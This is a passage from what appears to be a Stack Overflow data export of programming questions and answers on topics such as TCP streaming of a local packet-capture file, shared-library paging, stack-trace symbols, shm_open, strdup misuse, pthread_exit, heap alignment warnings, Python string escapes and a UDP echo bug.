printf(""\n -------------------------Information Agent-------------------------\n"");
printf(""\n Socket was created\n"");

/*  Name the socket, as agreed with the server.  */

address.sin_family = AF_INET;
address.sin_addr.s_addr = inet_addr(""127.0.0.1"");
address.sin_port = ntohs(9734);
len = sizeof(address);

data_capture(); //program included for capturing the data from ethernet

printf(""\n 'sniff_data' binary file has been created\n"");
/*  Create a socket for the client.  */
if((infosockfd = socket(AF_INET,SOCK_STREAM,0))&gt;0)
printf(""\n -------------------------Information Agent-------------------------\n"");
printf(""\n Socket was created\n"");

/*  Name the socket, as agreed with the server.  */

address.sin_family = AF_INET;
address.sin_addr.s_addr = inet_addr(""127.0.0.1"");
address.sin_port = ntohs(9734);
len = sizeof(address);

data_capture();

printf(""\n 'sniff_data' binary file has been created\n"");

/*  Now connect the socket to the task_agents socket.  */

if((result = connect(infosockfd, (struct sockaddr *)&amp;address, len))==0)
printf(""\n Connecting to the Task agent\n"");

if(result == -1)
{
    perror(""Error in connection\n"");
    exit(1);
}

fh = open(fname , O_RDONLY);    
if(fh==-1)
{
    perror(""sniff_data File not opened!!\n"");
return(1);
} 

 int total=0;
 // int fff=0;
 do
     {         
       cont=read(fh, buffer, buffsize);
       total=total+cont;  //this is used to debug 
       printf("" data read=%d\n"",total);
       cont2=write(infosockfd,buffer,cont);

     }
while (cont&gt;0);
close(fh);    
printf(""\n Information agent has sent 'sniff_data' binary file to the Task agent\n\n"");
close(infosockfd);
exit(0);
}
</code></pre>

<p>The following is the output in the terminal where info agent is the client and task agent is server. client receives 11 packets because i have given count=10; but when server receives and processes it it receives only 3 packets? why is it. I feel there is problem in reading the data from the binary file? is it? if so how to solve it .? please somebody guide me </p>

<pre><code> -------------------------Information Agent-------------------------

 Socket was created

 Entered Promiscuous Mode Successfully

 Client Receiving the Packets...

 total recieved packets are 156

 total recieved packets are 305

 total recieved packets are 367

 total recieved packets are 459

 total recieved packets are 640

 total recieved packets are 807

 total recieved packets are 972

 total recieved packets are 1151

 total recieved packets are 1237

 total recieved packets are 1323

 total recieved packets are 1409

 Done

 'sniff_data' binary file has been created

  Connecting to the Task agent
  data read=1024
  data read=1409
  data read=1409
  Information agent has sent 'sniff_data' binary file to the Task agent
</code></pre>

<hr>

<pre><code> ---------------------------Task Agent---------------------------

 Socket was created


 Task agent waiting...

 Information agent is connected

 Starting..
            TCP : 0   UDP : 0   ICMP : 0   Others : 3   Total : 3
 Finished


 Task agent processed the contents and saved it in 'info_agent_report' file
</code></pre>
","9530","","<p>TCP is a <em>stream protocol</em>, not a <em>message protocol</em>.  What that means is that regardless of the number of times you call <code>send(2)</code> (or equivalently <code>write(2)</code>) on the socket, and regardless of the buffer sizes passed to those calls, the data on the wire is semantically just a single continuous stream of bytes.  There are no boundaries between messages.</p>

<p>Therefore, when the receiver reads a TCP stream, it only sees that same stream of bytes.  There's no guarantee that each call to <code>recv(2)</code> (or equivalently <code>read(2)</code>) will read exactly one message that was sent with a call to <code>send(2)</code>.  You might get half of a message, of the message was fragmented, or you may get multiple messages in a single call.  You can never be sure.</p>

<p>If you want to have a message-based protocol on top of TCP, you need to build in that layer yourself.  One very simple way to do that is to prefix each message with its length.  That way, the receiver knows when each message ends and where the next begins.  There are other, more complicated schemes as well.</p>
"
"<p>I'm embedding binary data (a pdf document) into a shared library using a unsigned char[] variable. That is, I have a C file containing something like this:</p>

<p>unsigned char large_data[] = {0x24, 0x23...};
int sizeofLargeData = sizeof(large_data);</p>

<p>The large data can be many megabytes. My question is, when the shared library is loaded by an application, is this data loaded into memory? </p>
","9530","","<p>When a shared library is loaded by an application (either through an implicit dependency or an explicit call to <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms684175%28v=vs.85%29.aspx"" rel=""nofollow""><code>LoadLibrary()</code></a> on Windows or <a href=""http://linux.die.net/man/3/dlopen"" rel=""nofollow""><code>dlopen(3)</code></a> on POSIX systems), the loader <em>maps</em> the entirety of the DLL's contents (its executable code and its global variable segments) into memory in the process's virtual address space, but it doesn't immediately load all of the data by reading it from disk.</p>

<p>Modern OSes like Windows, Linux, and Mac OS X use <a href=""https://en.wikipedia.org/wiki/Demand_paging"" rel=""nofollow""><em>demand paging</em></a> to load modules.  What this means is that the data doesn't actually get read from disk until it's accessed.  When you access data on a page that hasn't been loaded yet (say, by calling an exported function for the first time or by accessing a global variable form the module for the first time), a page fault exception is generated.  The OS handles the page fault, loads the corresponding code or data from disk, and then resumes the program from the fault location; since the data is now loaded, the program no longer page faults upon resuming.</p>

<p>Hence, if you have megabytes of data in the shared object and the program never accesses it, you never pay the I/O cost of having to load those megabytes from disk.  It's still technically mapped into memory—you can access it any time you want without any system calls—but the data hasn't actually been read off disk.</p>
"
"<p>I'm new in debugging with symbols (when no access to the testing machine is possible).</p>

<p>I already provided the client with Debug build with .pdb file but for some reason the dump file I get contains no entries specific to my .dll (although the customer insists the problem occurs there, in particular, the app hangs). The debug build was made with VC++ 2008 x86 (I also tried older VC++ 6.0 with no difference).</p>

<p>The stack trace customer provides looks like</p>

<pre>
ChildEBP RetAddr  
01ece854 773f8e44 ntdll!NtWaitForSingleObject+0x15
01ece8b8 773f8d28 ntdll!RtlpWaitOnCriticalSection+0x13e
01ece8e0 02a92003 ntdll!RtlEnterCriticalSection+0x150
WARNING: Stack unwind information not available. Following frames may be wrong.
01ece8f0 02a8b4fa MyDllName!DllRegisterServer+0xbd2dc
01ece920 02a8b49e MyDllName!DllRegisterServer+0xb67d3
01ece930 02a8746c MyDllName!DllRegisterServer+0xb6777
01ece93c 029dc5ca MyDllName!DllRegisterServer+0xb2745
01ece99c 02a819e4 MyDllName!DllRegisterServer+0x78a3
01ecea80 02a09776 MyDllName!DllRegisterServer+0xaccbd
01eceb00 02a32506 MyDllName!DllRegisterServer+0x34a4f
01eceb58 029f44bf MyDllName!DllRegisterServer+0x5d7df
01ececdc 029f5e20 MyDllName!DllRegisterServer+0x1f798
01eceda0 029f76da MyDllName!DllRegisterServer+0x210f9
01ecedf4 291fe0ce MyDllName!DllRegisterServer+0x229b3
01ecee98 29365243 ClientAppName!Class.Method2+0x262
01eceeb8 293378d9 ClientAppName!Class.Method1+0x37
</pre>

<p>But I'm not sure what all of this exactly means. Does DllRegisterServer+0x229b3 mean ""function which has address +229b3 to the address of DllRegisterServer in map file""?</p>

<p>In map file, I have something like</p>

<pre>
0002:0006d720 _DllRegisterServer@0 10137720 f DllName.obj
</pre>

<p>But when I sum 229b3 and 6d720, I don't have any match in the map file for the resulting value.</p>

<p>And why the stack trace shows DllRegisterServer as an address base? It's not the first address in the map file. There are many function before it, should they have negative offset then (seems meaningless)?</p>

<p>I guess I understand reading debugging things wrong, but can't figure out what exactly is wrong..</p>

<p>If I could find out the function names, this would let me move further.</p>

<p>Things get even more complicated as I don't think my .DLL has no critical sections but the customer insists it's my dll which causes entering a critical section and never getting out. For now, I don't yet know how to prove him wrong (or maybe find out that it's indeed my lib which somehow, indirectly, does this, maybe, Windows sockets or DNS resolve name to an IP address somewhere behind the scenes are using critical sections).</p>
","9530","","<p>This recent blog post by Raymond Chen is exactly the answer you're looking for: <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2013/11/15/10468136.aspx"" rel=""nofollow"">Restoring symbols to a stack trace originally generated without symbols</a>.</p>

<p>For some reason, the debugger (or whatever is producing that stack trace) is failing to find the debug symbols for your module, so it's doing the best it can with only the DLL's export table.  To paraphrase Raymond:</p>

<blockquote>
  <p>Ugh. A stack trace taken without working symbols. (There's no way
  that <em><code>DllRegisterServer</code></em> is a deeply recursive <em>750 KB</em> function. Just by
  casual inspection, you know that the symbols are wrong.)</p>
  
  <p>To see how to fix this, you just have to understand what the debugger
  does when it has no symbols to work from: It uses the symbols from the
  exported function table. For every address it wants to resolve, it
  looks for the nearest exported function whose address is less than or
  equal to the target value.</p>
</blockquote>

<p>Assuming you have the correct, matching symbols file (.pdb) for the version of the DLL that generated the stack trace, you can trick the debugger into loading the DLL <em>as if it were a process dump</em>, and then you can load the symbols for it:</p>

<pre><code>C:&gt; ntsd -z MyDllName.dll
</code></pre>

<p>NTSD is the <a href=""http://msdn.microsoft.com/en-us/library/windows/hardware/hh406277%28v=vs.85%29.aspx"" rel=""nofollow"">Microsoft NT Symbolic Debugger</a>, which is installed by default on all modern Windows versions.  You can also use WinDbg, but I'm not sure if there's a way to use Visual Studio with this technique.</p>

<p>Once you've got the DLL loaded into the debugger with symbols, you can then let the debugger do the heavy lifting to decode the stack trace.  See the blog post for more detailed examples of that.</p>
"
"<p>I have a small C program that opens/creates a <code>shm</code> area like this:</p>

<pre><code>s = shm_open(""/run/shm/procman_power"", O_RDWR|O_CREAT, S_IRUSR|S_IWUSR);
if(s &gt;= 0) printf(""s = %d\n"",s);
else perror(""shm_open"");
</code></pre>

<p>But when I execute it, this is what I get:</p>

<pre><code>$ df -h
Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1        73G   23G   47G  33% /
udev            490M  4.0K  490M   1% /dev
tmpfs           199M  784K  198M   1% /run
none            5.0M     0  5.0M   0% /run/lock
none            497M  360K  497M   1% /run/shm
none            100M   72K  100M   1% /run/user

$ gcc shmtest.c -o shmtest -lrt 
$ ./shmtest 
shm_open: No such file or directory
</code></pre>

<p>Why it is not creating it? I did get it to work a few days ago and now it's somehow broken...</p>
","9530","","<p>Shared memory objects are not ordinary file system paths, they are just names within an abstract namespace.  According to the <a href=""http://linux.die.net/man/3/shm_open"" rel=""nofollow""><code>shm_open(3)</code> manual page</a>:</p>

<blockquote>
  <p>For portable use, a shared memory object should be identified by a name of the form <code>/somename</code>; that is, a null-terminated string of up to <code>NAME_MAX</code> (i.e., 255) characters consisting of an initial slash, followed by one or more characters, none of which are slashes.</p>
</blockquote>

<p>So I would suggest using an object name such as <code>""/procman_power""</code> instead of what you're using.</p>

<p>Also note that <code>shm_open</code> returns a non-negative integer on success, so that <code>0</code> would be a valid success code, not a failure code.  You should be checking <code>if (s &gt;= 0)</code> to test if it succeeded.</p>
"
"<p>I'm trying this code:</p>

<pre><code>imei=Found_imei(pClient-&gt;GetBuffer());
printf(""6. CODICE IMEI %s \n"",imei); 
pClient-&gt;SetImei(imei);
printf(""6.1 CODICE IMEI %s \n"",pClient-&gt;GetImei());
free(imei); &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
printf(""6.2 CODICE IMEI %s \n"",pClient-&gt;GetImei());
</code></pre>

<p>where </p>

<pre><code>char *Found_imei(char *string) 
{
char *start;
char *end;
char str[40];
int l;

start=strstr(string,""imei:"");

strstr(start,"","");

l=end-start-5;
strncpy(str,start+5,l);
str[l]='\0';
return strdup(str); &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; 
}
</code></pre>

<p>After free command, an error occured in printf.</p>

<p>I'm doing some error in using strdup and free?</p>

<p>Thanks</p>
","9530","","<p>Several obvious problems I see:</p>

<ol>
<li>The return value of <code>strstr(start,"","");</code> is ignored, making that function call useless</li>
<li><code>end</code> is never initialized inside of the <code>Found_imei</code> function, so the pointer arithmetic <code>l=end-start-5;</code> results in Undefined Behavior</li>
<li><a href=""http://stackoverflow.com/questions/17096146/strncpy-doesnt-always-null-terminate""><code>strncpy</code> doesn't always null-terminate</a> its output.  That can easily lead to walking off the end of a string and into Undefined Behavior.</li>
<li>You're passing in <code>l</code> as the length parameter to <code>strncpy</code> when you should actually be passing the buffer size minus 1.  If <code>l</code> is 40 or more, you're going to be copying too many characters into <code>str</code> and smash your stack.</li>
</ol>

<p>I suspect that problems 1 and 2 are the result of a failure to copy+paste your exact code, since it looks like you intended to write <code>end = strstr(start,"","");</code>, but I can't be sure.  Nevertheless, problems 3 and 4 are still serious problems.</p>
"
"<p>I'v tried the following 3 <code>for</code> loops:</p>

<pre><code>#define loop 1000000000
NSDate *start;
NSDate *end;


// 1: empty for loop
start = [NSDate date];
for (NSInteger i = 0; i &lt; loop; i++) {
}
end = [NSDate date];
NSLog(@""time interval: %f"", [end timeIntervalSince1970] - [start timeIntervalSince1970]);


// 2: do-while for loop
start = [NSDate date];
for (NSInteger i = 0; i &lt; loop; i++) {
    do {
    } while (0);
}
end = [NSDate date];
NSLog(@""time interval: %f"", [end timeIntervalSince1970] - [start timeIntervalSince1970]);

// 3: @try-@finally for loop
start = [NSDate date];
for (NSInteger i = 0; i &lt; loop; i++) {
    @try {
    }
    @finally {
    }
}
end = [NSDate date];
NSLog(@""time interval: %f"", [end timeIntervalSince1970] - [start timeIntervalSince1970]);
</code></pre>

<p>I test those three <code>for</code> loops about 1 billion on my '07 Macbook Pro. And I recorded the timestamp to calculate the execution duration. Here are the results:</p>

<pre><code>1: empty for loop =&gt; 2.947088 sec
2: do-while for loop =&gt; 2.581905 sec
3: @try-@finally for loop =&gt; 4.216685 sec
</code></pre>

<p>What? do-while <code>for</code> loop is faster than empty <code>for</code> loop! </p>

<p>Why?</p>

<hr>

<p><strong>UPDATED</strong></p>

<p>I add some additional code (j++) in the <code>for</code> loop:</p>

<pre><code>NSInteger j;
#define loop 1000000000

// 1: empty for loop
j = 0
for (NSInteger i = 0; i &lt; loop; i++) {
    j++;
}

// 2: do-while for loop
j = 0;
for (NSInteger i = 0; i &lt; loop; i++) {
    do {
        j++;
    } while (0);
}

// 3: @try-@finally for loop
j = 0;
for (NSInteger i = 0; i &lt; loop; i++) {
    @try {
        j++;
    }
    @finally {
    }
}
</code></pre>

<p>Output:</p>

<pre><code>1: empty for loop =&gt; 2.590103 sec
2: do-while for loop =&gt; 2.138528 sec
3: @try-@finally for loop =&gt; 3.983589 sec
</code></pre>

<p>Those 3 are much faster than previous code, and do-while <code>for</code> loop is still fastest. Weird!</p>
","9530","","<p>It's not.  The output depends a lot on the particular compiler being used as well as the optimization settings in effect.  Any compiler worth its salt will optimize away both of the loops.  When I compile the following sample code, both Clang and GCC completely remove the loops at any non-zero optimization level (i.e. <code>-O1</code> and above):</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;sys/time.h&gt;

#define loop 1000000000

int main(void)
{
  struct timeval t1, t2, t3;
  gettimeofday(&amp;t1, NULL);

  for (long i = 0; i &lt; loop; i++) {
  }

  gettimeofday(&amp;t2, NULL);

  for (long i = 0; i &lt; loop; i++) {
    do {
    } while (0);
  }

  gettimeofday(&amp;t3, NULL);

  int64_t d1 = (t2.tv_sec - t1.tv_sec) * 1000000ll + (t2.tv_usec - t1.tv_usec);
  int64_t d2 = (t3.tv_sec - t2.tv_sec) * 1000000ll + (t3.tv_usec - t2.tv_usec);

  printf(""Empty for loop:    %lld.%06d\n"", d1 / 1000000, (int)(d1 % 1000000));
  printf(""do-while for loop: %lld.%06d\n"", d2 / 1000000, (int)(d2 % 1000000));

  return 0;
}
</code></pre>

<p>At optimization level 0 (<code>-O0</code>, unoptimized code), both Clang and GCC produce code where either both loops run with the same speed (to within experimental error), or the do-while loop runs slightly slower due to the extra unoptimized code.  My results on a 64-bit Mac, using Clang 4.1 and GCC 4.2.1:</p>

<pre><code>Clang, 32-bit, -O0:
Empty for loop:    2.632714
do-while for loop: 2.633194

Clang, 64-bit, -O0:
Empty for loop:    2.632078
do-while for loop: 2.632046

Clang, 32-bit, -O1:
Empty for loop:    0.000000
do-while for loop: 0.000000

Clang, 64-bit, -O1:
Empty for loop:    0.000000
do-while for loop: 0.000000

GCC, 32-bit, -O0:
Empty for loop:    2.633221
do-while for loop: 2.633754

GCC, 64-bit, -O0:
Empty for loop:    2.778056
do-while for loop: 2.983421  (!!!)

GCC, 32-bit, -O1:
Empty for loop:    0.000001
do-while for loop: 0.000000

GCC, 64-bit, -O1:
Empty for loop:    0.000000
do-while for loop: 0.000000
</code></pre>
"
"<p>I am new to dealing with structs, particularly arrays of structs.</p>

<p>I am wondering if this is correct.</p>

<pre><code>(*(data+i)).member == data[i].member  ?      
</code></pre>
","9530","","<p>Yes, the two are guaranteed to be equivalent.  In particular, the C language standard defines array subscripting <code>data[i]</code> in terms of pointer arithmetic -- <code>data[i]</code> is equivalent to be <code>*(data + i)</code> <em>by definition</em>.</p>

<p>From C99 §6.5.2.1/2:</p>

<blockquote>
  <p>A postfix expression followed by an expression in square brackets <code>[]</code> is a subscripted
  designation of an element of an array object. The definition of the subscript operator <code>[]</code>
  is that <code>E1[E2]</code> is identical to <code>(*((E1)+(E2)))</code>. Because of the conversion rules that
  apply to the binary <code>+</code> operator, if <code>E1</code> is an array object (equivalently, a pointer to the
  initial element of an array object) and <code>E2</code> is an integer, <code>E1[E2]</code> designates the <code>E2</code>-th
  element of <code>E1</code> (counting from zero).</p>
</blockquote>

<p>Note that since the binary <code>+</code> operator is commutative, that means that <code>a[b]</code> is equivalent to <code>b[a]</code>, even if <code>b</code> is an integer and <code>a</code> is a pointer or array, so expressions like <code>4[""a character array""]</code> are legal and well-defined.</p>

<p>That said, writing <code>*(data + i)</code> is <em>usually</em> considered bad style (and <code>4[""a character array""]</code> would almost always be considered bad style, unless you're trying to win the International Obfuscated C Code Contest).  Unless you have a good reason, just write <code>data[i]</code> and be done with it.</p>
"
"<p>I saved a python dictionary in this way (actually with ""import cPickle as pickle""):</p>

<blockquote>
  <blockquote>
    <p>pickle.dump(dictname,open(""filename.pkl"",""wb""))</p>
  </blockquote>
</blockquote>

<p>And I load it in another script in this way:</p>

<blockquote>
  <blockquote>
    <p>dictname=pickle.load(open(""filename.pkl"",""rb""))</p>
  </blockquote>
</blockquote>

<p>How is it possible to close the file after this?</p>
","9530","","<p>It's better to use a <a href=""http://docs.python.org/2/reference/compound_stmts.html#the-with-statement"" rel=""nofollow""><code>with</code> statement</a> instead, which closes the file when the statement ends, even if an exception occurs:</p>

<pre><code>with open(""filename.pkl"", ""wb"") as f:
    pickle.dump(dictname, f)
...
with open(""filename.pkl"", ""rb"") as f:
    dictname = pickle.load(f)
</code></pre>

<p>Otherwise, the file will only get closed when the garbage collector runs, and when that happens is indeterminate and almost impossible to predict.</p>
"
"<p>Here is my program just to find the difference between pthread_exit and return from a thread.</p>

<pre><code>struct foo{
    int a,b,c,d;
    ~foo(){cout&lt;&lt;""foo destructor called""&lt;&lt;endl;}
};
//struct foo foo={1,2,3,4};
void printfoo(const char *s, const struct foo *fp)
{
    cout&lt;&lt;s;
    cout&lt;&lt;""struct at 0x""&lt;&lt;(unsigned)fp&lt;&lt;endl;
    cout&lt;&lt;""foo.a=""&lt;&lt;fp-&gt;a&lt;&lt;endl;
    cout&lt;&lt;""foo.b=""&lt;&lt;fp-&gt;b&lt;&lt;endl;
    cout&lt;&lt;""foo.c=""&lt;&lt;fp-&gt;c&lt;&lt;endl;
    cout&lt;&lt;""foo.d=""&lt;&lt;fp-&gt;d&lt;&lt;endl;
}
void *thr_fn1(void *arg)
{
    struct foo foo={1,2,3,4};
    printfoo(""thread1:\n"",&amp;foo);
    pthread_exit((void *)&amp;foo);
    //return((void *)&amp;foo);
}
int main(int argc, char *argv[])
{
    int err;
    pthread_t tid1,tid2;
    struct foo *fp;
    err=pthread_create(&amp;tid1,NULL,thr_fn1,NULL);
    if(err!=0)
            cout&lt;&lt;""can't create thread 1""&lt;&lt;endl;
    err=pthread_join(tid1,(void **)&amp;fp);
    if(err!=0)
            cout&lt;&lt;""can't join with thread 1""&lt;&lt;endl;
    exit(0);
}
</code></pre>

<p>In ""*thr_fn1"" thread function I created an object foo.</p>

<p>According to the site <a href=""http://stackoverflow.com/questions/3844678/pthread-exit-vs-return"">pthread_exit vs. return</a>
when I exit the thread function ""thr_fun1()"" using ""return((void *)&amp;foo);"" it should call the destructor for the object foo, but it should not call the destructor when I call ""pthread_exit((void *)&amp;foo);"" to return to main from function ""thr_fun1()"".</p>

<p>But in both the cases using ""return((void *)&amp;foo);"" or ""pthread_exit((void *)&amp;foo);"" the local object ""foo"" in function ""thr_fun1()"" is getting called.</p>

<p>This is not the behaviour I guess. Destructor should be called only in ""return((void *)&amp;foo);"" case only.</p>

<p>Please verify me if I am wrong?</p>
","9530","","<p>Yes, that's right.  <code>pthread_exit()</code> immediately exits the current thread, without calling any destructors of objects higher up on the stack.  If you're coding in C++, you should make sure to either always <code>return</code> from your thread procedure, or only call <code>pthread_exit()</code> from one of the bottommost stack frames with no objects with destructors still alive in that frame or any higher frames; otherwise, you will leak resources or cause other bad problems.</p>
"
"<p><strong>Important Information:</strong></p>

<ul>
<li>Development OS: Windows 8.1 64 bit</li>
<li>Target OS: Windows 8.1 64 bit</li>
<li>IDE: Visual Studio 2013 Professional</li>
<li>Language: C++</li>
</ul>

<p><strong>The Problem:</strong></p>

<p>I get the following warning when compiling my static library project through the IDE:</p>

<pre><code>warning C4316: ... : object allocated on the heap may not be aligned 16
</code></pre>

<p>I could simply ignore this warning...but I'm assuming it's there for a reason and would like to at least understand what it means and what implications it could have in the future.</p>

<p><strong>I believe this line of code is related to the problem</strong>, which is called inside my Win32 window wrapper class:</p>

<pre><code>m_direct3D = new Direct3D(this);
</code></pre>

<p>m_direct3D is a pointer to my Direct3D wrapper class.</p>

<p><strong>Here is the header file for the wrapper</strong> (I admit it needs trimming down):</p>

<pre><code>#pragma once

// Windows
#include &lt;d3d11.h&gt;
#include &lt;DirectXMath.h&gt;

// Standard
#include &lt;stdint.h&gt;
#include &lt;vector&gt;

// JGlib
#include ""Window.h""

namespace JGlib
{
    namespace Graphics
    {
        class Direct3D
        {
        public:
            // Construtor and destructor
            Direct3D(const JGlib::Graphics::Window* window);
            ~Direct3D();

            // Public methods
            void Initialise();
            void BeginDraw();
            void Draw();
            void EndDraw();

        private:
            // Private methods

            // Private member variables
            const Window*               m_window;
            ID3D11Device*               m_device;
            IDXGIAdapter*               m_adapter;
            DXGI_ADAPTER_DESC           m_adapterDescription;
            uint32_t                    m_videoCardMemory;
            IDXGIFactory*               m_factory;
            IDXGIOutput*                m_monitor;
            DXGI_MODE_DESC*             m_displayModes;
            uint32_t                    m_numberOfModes;    
            DXGI_RATIONAL               m_refreshRate;
            DXGI_SWAP_CHAIN_DESC        m_swapChainDescription;
            D3D_FEATURE_LEVEL           m_featureLevel;
            ID3D11DeviceContext*        m_deviceContext;
            IDXGISwapChain*             m_swapChain;
            ID3D11Texture2D*            m_backBuffer;
            ID3D11RenderTargetView*     m_renderTargetView;
            ID3D11Texture2D*            m_depthStencilBuffer;
            D3D11_TEXTURE2D_DESC        m_depthBufferDescription;
            D3D11_DEPTH_STENCIL_DESC    m_depthStencilDescription;
            ID3D11DepthStencilState*    m_depthStencilState;
            ID3D11DepthStencilView*     m_depthStencilView;
            D3D11_RASTERIZER_DESC       m_rasterDescription;
            D3D11_VIEWPORT              m_viewport; 
            float                       m_fieldOfView;
            float                       m_screenAspectRatio;
            ID3D11RasterizerState*      m_rasterState;
            DirectX::XMMATRIX           m_projectionMatrix;
            DirectX::XMMATRIX           m_worldMatrix;
            DirectX::XMMATRIX           m_orthographicMatrix;
            float                       m_screenDepth;
            float                       m_screenNear;
        };
    }
}
</code></pre>

<p>I tried googling the issue, but found little information. The information I did find I did not understand.</p>

<p><strong>The conclude, I am asking the following:</strong></p>

<ol>
<li>What does C4316 mean?</li>
<li>What is causing it in my code?</li>
<li>What implications could this have in the future, if I ignore it?</li>
<li>How do I ""fix"" the problem that is causing this warning to appear?</li>
</ol>

<p><strong>Additional Information:</strong></p>

<p>When I changed Visual Studio's configuration manager to compile for x64, this issue does not occur.</p>
","9530","","<blockquote>
  <p>What does C4316 mean?</p>
</blockquote>

<p>C4316 is the error code.  It's a unique identifier that makes it easy to find <a href=""http://msdn.microsoft.com/en-us/library/vstudio/dn448573.aspx"">the documentation</a>.</p>

<blockquote>
  <p>What is causing it in my code?</p>
</blockquote>

<p>The usage of the <code>DirectX::XMMATRIX</code> class.  Instances of that class must be aligned on 16-byte boundaries.  The compiler makes sure that whenever you create a <code>JGLib::Graphics::Direct3D</code> instance on the stack or at global scope, it will align it properly, but if you allocate an instance dynamically on the heap, the compiler can't guarantee that the object will be aligned properly, because <code>malloc()</code> and friends typically only guarantee 8-byte alignment.</p>

<blockquote>
  <p>What implications could this have in the future, if I ignore it?</p>
</blockquote>

<p>Your code may crash when accessing those matrix instances due to <a href=""https://en.wikipedia.org/wiki/Streaming_SIMD_Extensions"">SSE</a> instructions operating on misaligned data.</p>

<blockquote>
  <p>How do I ""fix"" the problem that is causing this warning to appear?</p>
</blockquote>

<p>As the documentation suggests, you need to override your class's <code>operator new</code> and <code>operator delete</code> in order to guarantee 16-byte alignment.  You can use <a href=""http://msdn.microsoft.com/en-us/library/8z34s9c6.aspx""><code>_aligned_malloc()</code></a> and <a href=""http://msdn.microsoft.com/en-us/library/17b5h8td.aspx""><code>_aligned_free()</code></a> to allocate and free memory aligned on larger alignments.</p>
"
"<p>i read some info on python's EOL error, and i find <a href=""http://stackoverflow.com/a/11328385/1889327"">an explanation about that error</a>. The author gives an instance about the correct ones, however i can not figure out how does the string <code>""""""\\""Axis of Awesome\\\""""""""</code> can work. Can someone do me a favor to explain how does the string interrupt.Thanks.</p>

<p>==================================================</p>

<p>the answer:
i thought it a lot and finally figure it out. The <a href=""http://stackoverflow.com/a/11328385/1889327"">explanation</a> does the <strong><code>__repr__</code></strong> function on string and outputs <strong><code>\\""Axis of Awesome\\""</code></strong>, however in Hyperboreus's explanation, the <strong><code>__str__</code></strong> function on string has been called and eventually the result is <strong><code>\""Axis of Awesome\""</code></strong>. Actually, they are the same. </p>
","9530","","<pre><code>""""""\\""Axis of Awesome\\\""""""""
</code></pre>

<p>is parsed as</p>

<pre><code>""""""   \\   ""   Axis of Awesome  \\  \""  """"""
1     2    3   4                5   6   7
</code></pre>

<ol>
<li>Start of string literal</li>
<li>Escaped literal backslash</li>
<li>Literal quotation mark</li>
<li>Literal text</li>
<li>Escaped literal backslash</li>
<li>Escaped literal quotation mark</li>
<li>End of string literal</li>
</ol>

<p>If you were to print this out, you'd get:</p>

<pre><code>\""Axis of Awesome\""
</code></pre>

<p>The example you linked to has one fewer backslash at the end, and is instead parsed like this:</p>

<pre><code>""""""   \\   ""   Axis of Awesome  \\  """"""  ""
1     2    3   4                5   6    7
</code></pre>

<ol>
<li>Start of string literal</li>
<li>Escaped literal backslash</li>
<li>Literal quotation mark</li>
<li>Literal text</li>
<li>Escaped literal backslash</li>
<li>End of string literal</li>
<li>Start of new singly-quoted string literal; since there's no close quote before the end-of-line, this is a syntax error</li>
</ol>
"
"<p>Am trying to implement a echo client. Client using sendto() is transmitting the message and server is receiving n displaying it. but then server is not sending the message (echo back). here is the code of both server and client. Can anyone help me with this? </p>

<p>Server: </p>

<pre><code>char msg[100]="""";
int conn_sock,n;
struct sockaddr_in server_addr,client_addr;
conn_sock=socket(AF_INET,SOCK_DGRAM,0);

server_addr.sin_family=AF_INET;
server_addr.sin_port=htons(1234);
server_addr.sin_addr.s_addr=inet_addr(""127.0.0.1"");
err=bind(conn_sock, (struct sockaddr *)&amp;server_addr,sizeof(server_addr));

n=recvfrom(conn_sock,msg,sizeof(msg),0,(struct sockaddr *)&amp;client_addr,(socklen_t *)&amp;client_addr);
n=sendto(conn_sock,msg,sizeof(msg),0,(struct sockaddr *)&amp;client_addr,sizeof(client_addr));
</code></pre>

<p>in recvfrom the value of n is number of bytes. but in sendto() value of n is -1</p>

<p>Client:</p>

<pre><code>char msg[100];
int conn_sock,n,err;
struct sockaddr_in server_addr;
conn_sock=socket(AF_INET,SOCK_DGRAM,0);

server_addr.sin_family=AF_INET;
server_addr.sin_port=htons(1234);
server_addr.sin_addr.s_addr=inet_addr(""127.0.0.1"");

cin&gt;&gt;msg;
n=sendto(conn_sock,msg,strlen(msg),0,(struct sockaddr *)&amp;server_addr,sizeof(server_addr));       
n=recvfrom(conn_sock, msg, 15, 0, (struct sockaddr*) &amp;server_addr,(socklen_t *)&amp;server_addr);
</code></pre>

<p>recvfrom() is not receiving any data from the server. </p>
","9530","","<p>These two lines are both wrong:</p>

<pre><code>// In the server
n=recvfrom(conn_sock,msg,sizeof(msg),0,(struct sockaddr *)&amp;client_addr,(socklen_t *)&amp;client_addr);

// In the client
n=recvfrom(conn_sock, msg, 15, 0, (struct sockaddr*) &amp;server_addr,(socklen_t *)&amp;server_addr);
</code></pre>

<p>The last two parameters of <code>recvfrom()</code> are supposed to point to two <strong>separate</strong> variables.  One of them receives the other peer's network address, and the other one receives the length of that network address.  That you're passing the same pointer value into both means that the address length is overwriting the first several bytes of the address data, corrupting it and resulting in badness.</p>

<p>Here's how the server should work, receiving the length into a separate variable:</p>

<pre><code>struct sockaddr_storage client_addr;
socklen_t client_addr_len = sizeof(client_addr);  // This is an in+out parameter
n=recvfrom(..., (struct sockaddr *)&amp;client_addr, &amp;client_addr_len);
n=sendto(..., (struct sockaddr *)&amp;client_addr, client_addr_len);
</code></pre>

<p>Note that I used a <code>sockaddr_storage</code> instead of <code>sockaddr_in</code>.  A <code>sockaddr_storage</code> is guaranteed to be large enough to hold any valid socket address type for supported address families, so that this code will be forward-compatible with IPv6.</p>

<p>Likewise, here's how the client should work:</p>

<pre><code>n=sendto(..., &amp;server_addr, sizeof(server_addr));
do
{
  struct sockaddr_storage peer_addr;
  socklen_t peer_addr_len = sizeof(peer_addr);
  n=recvfrom(..., (struct sockaddr *)&amp;peer_addr, &amp;peer_addr_len);
} while (!areSockAddrsEqual((struct sockaddr *)&amp;server_addr, (struct sockaddr *)&amp;peer_addr));

...

bool areSockAddrsEqual(struct sockaddr *addr1, struct sockaddr *addr2)
{
    if (addr1-&gt;sa_family != addr2-&gt;sa_family)
        return false;

    switch (addr1-&gt;sa_family)
    {
    case AF_INET:
        struct sockaddr_in *addr1_in = (struct sockaddr_in *)addr1;
